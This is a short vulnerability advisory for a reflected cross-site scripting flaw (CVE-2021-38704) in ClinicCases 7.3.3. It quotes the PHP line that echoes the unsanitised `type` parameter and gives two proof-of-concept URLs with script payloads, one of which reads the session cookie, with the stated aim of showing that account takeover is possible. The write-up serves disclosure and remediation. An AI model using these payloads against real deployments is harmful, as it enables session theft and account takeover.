# CVE-2021-38704
## ClinicCases 7.3.3 Reflected Cross-Site Scripting (XSS)

Multiple reflected cross-site scripting (XSS) vulnerabilities in
ClinicCases 7.3.3 allow unauthenticated attackers to introduce
arbitrary JavaScript by crafting a malicious URL. This can result in
account takeover via session token theft.

### Detail

The HTTP GET parameter `type` is unsanitised and reflected in `messages_load.php` line `182`.

```php
echo "<div class='alert alert-danger' role='alert'>There are no messages in your $type folder</div>";
```

The following payload can be used to trigger a cross-site scripting attack when clicked by an authenticated user:

```html
http://cliniccases.local/cliniccases/lib/php/data/messages_load.php?type=<script>alert(document.domain)</script>
```

![image](https://user-images.githubusercontent.com/52385049/132093825-d7ec0119-5412-4eef-9226-a59ad421db76.png)

As the `PHPSESSID` session cookie is insufficiently protected, it can be stolen by malicious JavaScript. This can be used for account takeover and session riding attacks.


```html
http://cliniccases.local/cliniccases/lib/php/data/messages_load.php?type=<script>alert(document.cookie)</script>
```

![image](https://user-images.githubusercontent.com/52385049/132093901-ef592742-1a7c-4cbe-9aa6-37b3f3792701.png)
